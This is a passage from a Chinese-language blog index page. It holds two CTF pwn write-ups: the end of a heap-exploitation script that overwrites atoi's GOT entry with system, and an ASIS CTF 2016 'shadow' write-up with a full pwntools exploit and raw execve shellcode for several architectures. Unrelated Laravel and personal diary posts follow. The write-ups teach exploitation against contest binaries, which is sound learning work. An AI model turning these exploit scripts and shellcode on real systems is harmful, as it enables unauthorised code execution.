class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Firstname : &quot;</span>)</span><br><span class="line">    atoi_addr = u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    log.success(<span class="string">&quot;atoi_addr: &quot;</span>+<span class="built_in">hex</span>(atoi_addr))</span><br><span class="line">    libc.address += atoi_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">17</span>):</span><br><span class="line">        model = <span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>)+i)*<span class="number">4</span></span><br><span class="line">        price = <span class="number">100</span>+i</span><br><span class="line">        log.info(<span class="string">&quot;add car: &quot;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">15</span>: <span class="comment"># fake chunk</span></span><br><span class="line">            model = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">            price = <span class="number">0x1111</span></span><br><span class="line">        add_car(model, price)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak heap base</span></span><br><span class="line">    log.info(<span class="string">&quot;leaking heap base...&quot;</span>)</span><br><span class="line">    heap_base = leak_heap(<span class="number">16</span>)</span><br><span class="line">    log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overflow one byte of heap address</span></span><br><span class="line">    log.info(<span class="string">&quot;overflowing heap address...&quot;</span>)</span><br><span class="line">    choice = [<span class="number">3</span>, <span class="number">1</span>]</span><br><span class="line">    data   = [<span class="string">&quot;comment&quot;</span>, <span class="string">&quot;A&quot;</span>*<span class="number">33</span>]</span><br><span class="line">    sel_car_cust(<span class="number">16</span>, <span class="built_in">zip</span>(choice, data))   </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># add comment and overwrite customer pointer, change it to atoi@got.plt</span></span><br><span class="line">    log.info(<span class="string">&quot;modifying car 15 struct (for leaking got)...&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># add customer</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;3&quot;</span>) <span class="comment"># add comment</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;: \n&quot;</span>, p64(<span class="number">0x1111</span>) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># exit customer menu</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>) <span class="comment"># exit select car menu</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># leak atoi&#x27;s got</span></span><br><span class="line">    log.info(<span class="string">&quot;leaking atoi&#x27;s got &amp; libc base...&quot;</span>)</span><br><span class="line">    leak_got(<span class="number">15</span>)</span><br><span class="line">    system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&quot;libc base: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    log.success(<span class="string">&quot;system: &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overwrite customer pointer to heap_base+0x10</span></span><br><span class="line">    log.info(<span class="string">&quot;modifying car 15 struct (for corrupting car array)...&quot;</span>)</span><br><span class="line">    choice = [<span class="number">3</span>]</span><br><span class="line">    data   = [p64(<span class="number">0x1111</span>) + p64(heap_base+<span class="number">0x10</span>)]</span><br><span class="line">    sel_car_cust(<span class="number">16</span>, <span class="built_in">zip</span>(choice, data))   </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>) <span class="comment"># exit select car menu</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># free &amp; reallocate heap_base+0x10 , now we can control the car array </span></span><br><span class="line">    <span class="comment"># after we control the car array, overite car[14] and make it point to atoi&#x27;s got</span></span><br><span class="line">    log.info(<span class="string">&quot;modifying car array...&quot;</span>)</span><br><span class="line">    choice = [<span class="number">3</span>]</span><br><span class="line">    data   = [<span class="string">&quot;A&quot;</span>*<span class="number">0x20</span>+p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>])]</span><br><span class="line">    sel_car_cust(<span class="number">15</span>, <span class="built_in">zip</span>(choice, data))   </span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;5&quot;</span>) <span class="comment"># exit select car menu</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># overwrite atoi&#x27;s got</span></span><br><span class="line">    log.info(<span class="string">&quot;overwriting atoi&#x27;s got...&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;4&quot;</span>) <span class="comment"># select car</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;index\n&quot;</span>, <span class="string">&quot;14&quot;</span>) <span class="comment"># input index</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;\n&quot;</span>, <span class="string">&quot;2&quot;</span>) <span class="comment"># set model (atoi&#x27;s got)</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;model\n&quot;</span>, p64(system))</span><br><span class="line">    r.sendline(<span class="string">&quot;sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;get shell !&quot;</span>)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>
<p>寫完 exploit 之後拿來跑，然後就 timeout 了… </p>
<p>傳到 trello 請 Ann Tsai 幫忙跑之後就去睡了，結果醒來時卻發現這題還沒過 @@<br>原來是 Ann Tsai 在拿到 shell 之後找不到 flag ?! </p>
<p>結果用她的機器進行測試的時候發現 flag 藏在一個頗猥瑣的位置</p>
<pre>
$ ls -la
total 40
drwxr-x--- 2 root marketpwn  4096 Sep  8 10:02 .
drwxr-xr-x 3 root root       4096 Sep  8 09:51 ..
lrwxrwxrwx 1 root marketpwn     9 Sep  8 09:59 .bash_history -> /dev/null
-rw-r--r-- 1 root marketpwn   220 Sep  8 09:51 .bash_logout
-rw-r--r-- 1 root marketpwn  3771 Sep  8 09:51 .bashrc
-rwxr-xr-x 1 root marketpwn 10504 Sep  8 09:56 car_market
-r--r----- 1 root marketpwn    39 Sep  8 09:57 ._flag
-rw-r--r-- 1 root marketpwn   655 Sep  8 09:51 .profile
-rwxr-xr-x 1 root marketpwn   104 Sep  8 09:56 wrapper.sh
</pre>

<p>看來主辦方是想惡搞我們參賽者。沒關係，cat flag 下一下結束這回合:  </p>
<pre>
$ cat ._flag
cat: ._flag: No such file or directory
</pre>

<p>(☉д⊙)………WTF ?!</p>
<p>主辦方不知道下了什麼巫術，讓我們看到了 flag 檔名卻不讓我們 cat flag 的內容。之後進行了一連串 command line 的嘗試，例如 <code>for f in .*;do cat $f;done</code>，不過還是無法讀取。最後是 ddaa 用 <code>cat .*</code> 讓 flag 噴出來的……到現在還是匪夷所思…..</p>
<p>flag: <code>ASIS&#123;a0b8813fc566836c8b5f37fe68c684c5&#125;</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/14/ASIS-CTF-Finals-2016-shadow-99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/14/ASIS-CTF-Finals-2016-shadow-99/" itemprop="url">[ASIS CTF Finals 2016] shadow 99</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-14T18:04:00+08:00">
                2016-09-14
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><blockquote>
<p>Category: pwn<br>Point: 99<br>Solver: bruce30262 @ BambooFox<br>感謝 Ann Tsai 提供機器並幫忙跑 exploit，以及 angelboy 對 exploit 的指點 XD</p>
</blockquote>
<h2 id="Analyzing"><a href="#Analyzing" class="headerlink" title="Analyzing"></a>Analyzing</h2><p>32 bit ELF, 除了 stack guard 有開以外其他保護全部沒開</p>
<p>程式首先會用 <code>mmap</code> 配置一塊大小為 0x30000 的記憶體區塊，並將其當成 shadow stack 來使用，存放 return address。  </p>
<p>main function 裡面會先要我們輸入名字 (buffer 位址在 .bss 段)，之後我們可以選擇新增一個 beer，或是讀取&#x2F;編輯一個 beer description。</p>
<p>新增一個 beer 時，程式會先要求 beer description 的長度，之後會呼叫 malloc 配置一塊相對應大小的 buffer 給我們輸入 beer description 的內容。至於讀取&#x2F;編輯一個 beer description 則是會先要我們選擇要讀取&#x2F;編輯的 beer，之後會印出 beer 的 description，並詢問我們是否要編輯 beer 的 description。此時如果輸入一個 invalid 的選項 ( not y or n )，程式會直接進行遞迴呼叫，再 call 一次該 function 並做同樣的事情，直到我們輸入 y 或 n 為止。</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>這題關鍵的地方在於  </p>
<ul>
<li>我們可以控制 malloc 的長度，以及 malloc 後 buffer 的內容</li>
<li>我們可以對程式做遞迴呼叫</li>
</ul>
<p>glibc 的 malloc 在 size 很大的時候 (超過 0x20000)，會改用 mmap 來進行動態的記體配置。而 mmap 出來的 memory page，會接在上一次 mmap 出來的 memory page 的前面。因此，透過第一點，我們可以嘗試去新增一個長度很長的 beer description，這樣程式在呼叫 mmap 之後<strong>會將我們 beer description 的 buffer 接在 shadow stack 的前面。</strong>  </p>
<p>之後我們可以嘗試對程式進行多次的遞迴呼叫，讓 shadow stack 不斷的 “往上長” (意即 shadow stack 的 top 位址會不斷得往前移)。只要 shadow stack 長到某一程度，就會跟我們 beer description 的 buffer 重疊在一起。此時我們再透過編輯 beer description 的功能，就可以改到 shadow stack 上的 return address，讓程式跳到我們想要的位址。這題因為只有 stack guard 的關係，可以執行 shellcode。 我們可以透過將 shellcode 塞入 name buffer，然後將 return address 改成 name buffer 位址的方式來跳 shellcode。</p>
<figure class="highlight python"><figcaption><span>exp_shadow.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;shadow.asis-ctf.ir&quot;</span></span><br><span class="line">PORT = <span class="number">31337</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./shadow&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_recvuntil</span>(<span class="params">s, delim</span>):</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> delim <span class="keyword">not</span> <span class="keyword">in</span> res:</span><br><span class="line">        c = s.recv(<span class="number">1</span>)</span><br><span class="line">        res += c</span><br><span class="line">        sys.stdout.write(c)</span><br><span class="line">        sys.stdout.flush()</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">myexec</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sc</span>(<span class="params">arch=context.arch</span>):</span><br><span class="line">    <span class="keyword">if</span> arch == <span class="string">&quot;i386&quot;</span>:</span><br><span class="line">        <span class="comment"># shellcraft.i386.linux.sh(), null free, 22 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x6a\x0e\x58\x48\x48\x48\x99\xcd\x80&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&quot;amd64&quot;</span>:</span><br><span class="line">        <span class="comment"># shellcraft.amd64.linux.sh(), null free, 24 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x31\xf6\x6a\x3b\x58\x99\x0f\x05&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&quot;arm&quot;</span>:</span><br><span class="line">        <span class="comment"># null free, 27 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x09\x30\x49\x40\x52\x40\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> arch == <span class="string">&quot;aarch64&quot;</span>:</span><br><span class="line">        <span class="comment"># 4 null bytes, total 35 bytes</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x06\x00\x00\x14\xe0\x03\x1e\xaa\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x21\x00\x00\xd4\xfb\xff\xff\x97\x2f\x62\x69\x6e\x2f\x73\x68&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_one</span>(<span class="params">size, desr</span>):</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;send desc length&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;length?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    log.info(<span class="string">&quot;send desc&quot;</span>)</span><br><span class="line">    r.send(desr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    shellcode_addr = <span class="number">0x0804a520</span></span><br><span class="line">    shellcode = sc()</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;send name (shellcode)&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;name?\n&quot;</span>, shellcode)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;it?\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;add one beer&quot;</span>)</span><br><span class="line">    add_one(<span class="number">0x20000</span>, <span class="string">&quot;A&quot;</span>*(<span class="number">0x20000</span>-<span class="number">4</span>)+<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;beer uploaded to the memory!\n&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;0\n&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;add beer done&quot;</span>)</span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;choose desc&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>) <span class="comment"># choose desc</span></span><br><span class="line">    r.sendline(<span class="string">&quot;0&quot;</span>) <span class="comment"># input index</span></span><br><span class="line"></span><br><span class="line">    log.info(<span class="string">&quot;recieving BBBB&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> r.recvuntil(<span class="string">&quot;BBBB&quot;</span>)</span><br><span class="line">    log.info(<span class="string">&quot;recieving rest output&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span> r.recvline()</span><br><span class="line">    log.info(<span class="string">&quot;start stacking stack&quot;</span>)</span><br><span class="line"></span><br><span class="line">    maxx = <span class="number">80000</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(maxx):</span><br><span class="line">        check = i% <span class="number">10000</span></span><br><span class="line">        <span class="keyword">if</span> check == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> i</span><br><span class="line">        r.sendline(<span class="string">&quot;z&quot;</span>)</span><br><span class="line"></span><br><span class="line">    r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">    r.send(p32(shellcode_addr)*(<span class="number">0x20000</span>/<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>


<p>不過因為主辦方網路不穩的關係，我自己跑 exploit local 端是可以 work，但是 remote 端會 timeout，因此最後是將 exploit 上傳到 trello 請隊友 Ann Tsai 幫忙跑。一開始跑的時候還是會在某個地方卡住，經過安博的指點之後修了一下 exploit，最後成功拿 shell 並得到 flag。  </p>
<p>flag: <code>ASIS&#123;732f9beb138dbca4e44d5d184c3074dc&#125;</code></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/10/2016/custom-responses-of-laravel-validations/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/10/2016/custom-responses-of-laravel-validations/" itemprop="url">自定义 Laravel Validator 所返回的响应</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-10T21:08:08+08:00">
                2016-09-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%8A%80%E6%9C%AF/" itemprop="url" rel="index">
                    <span itemprop="name">技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <p>不得不说 Laravel 的 <a target="_blank" rel="noopener" href="http://laravel-china.org/docs/5.1/validation">Validation</a> 是极好的，非常易于使用，麻麻再也不用担心我要写一大堆验证啦 ~(　^ω^)</p>
<p>但是这个 Validator 有一个神秘的地方 ( -д-)，正如官方文档所说，它会自动判断当前请求是否为 Ajax 发送的，如果是，则在验证失败的时候返回一个 <code>JsonResponse</code> 响应而不是 <code>RedirectResponse</code> 响应。</p>
<blockquote>
<p><strong>但是</strong>，这个 JSON 响应的状态码，是 422。</p>
</blockquote>
<p>WTF！坑爹呢这是！要知道 422 这个状态码是通不过 <code>jQuery.ajax.success</code> 的啊！</p>
<p><img src="https://img.prin.studio/legacy/image.php?di=WYT3"></p>
<p>在网上找了一圈，愣是没找着什么好一点的解决方法（全是叫你在 <code>$.ajax.failed</code> 里处理错误的）。</p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/10/2016/custom-responses-of-laravel-validations/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/10/%E4%B8%80%E8%A7%81%E9%92%9F%E6%83%85%EF%BC%8C%E6%97%A0%E7%96%BE%E8%80%8C%E7%BB%88/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/10/%E4%B8%80%E8%A7%81%E9%92%9F%E6%83%85%EF%BC%8C%E6%97%A0%E7%96%BE%E8%80%8C%E7%BB%88/" itemprop="url">一见钟情，无疾而终</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-09-10T19:29:57+08:00">
                2016-09-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E7%94%9F%E6%B4%BB%E6%84%9F%E6%82%9F/" itemprop="url" rel="index">
                    <span itemprop="name">生活感悟</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          昨天晚上，不知道为什么突然特别难过，或许是因为被同事说中心事，或许是因为想到我喜欢过的女孩而心存不甘，或许是因为憎恶现在这个状态的自己......总而言之，有那么一瞬间我感到我的心像是被挖去了一块，原来喜欢一个人可以让我如此难过，想到种种过往我以为自己会泣不成声，结果我声音哽咽着眼睛却是干的，或许我们最喜欢使用的那个“破涕为笑”的表情最能形容我当时的心境，我想了很久，一个人跑出去散步，当风轻轻地划过我的脸庞的时候，当秋天的寒意让我猝不及防的时候，我忽然觉得，当这个世界越发地充满“恶意”的时候，你更需要一个坚强地理由去生活，她们都教会我很多，和这个相比，悲伤和痛苦都显得微不足道，我想努力学好英语、我想努力练习写字、我想努力培养兴趣、我想努力克服恐惧，我是一个骄傲的人，在技术上是在生活上更应该是，如果我不能像编程一样掌控世界，我愿意在这纷繁的世界里不忘初心，喜欢和爱这种美好的情感，是不该让悲伤来消化的奢侈品;男人在年轻的时候，最难以接受而不得不接受的一个现实是，你非常喜欢一个人，可你此时此刻完全没有能力给她想要的生活，就像古古说她可能再遇不到我这样对她好的人，可她始终觉得我们两个人是没有未来的，而这一次，我忽然发现这一切是如此的相似，虽然我清楚地知道她们是完全不同的两个人，当她们同时对我说出“你会找到真正适合你的那个人”这句话的时候，我已无心分辨这句话的真假，我只知道我会陷入无休止的纠结，就像一个死循环导致的精神分裂;当一个男生接受女生“成为朋友”这种现实的时候，从某种意义上来讲，他是将对她的喜欢以一种新的方式重新输出，就像她不在公司里的时候，她愿意委托我帮她处理某些事情，这对我而言是非常开心的一个时刻，因为你永远都期待着，她在有事情的时候能够第一个想到你，即使她曾经拒绝过你两次，即使她明确告诉你她不喜欢你，我曾经告诉过自己，喜欢是占有而爱是克制，至少曾经有很多很多的瞬间，我们两个人因为坦露心声而变得非常开心，这是我最让我怀念的瞬间
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/09/10/%E4%B8%80%E8%A7%81%E9%92%9F%E6%83%85%EF%BC%8C%E6%97%A0%E7%96%BE%E8%80%8C%E7%BB%88/">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/09/07/MMA-CTF-2nd-2016-Interpreter-200/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/09/07/MMA-CTF-2nd-2016-Interpreter-200/" itemprop="url">[MMA CTF 2nd 2016] Interpreter 200</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
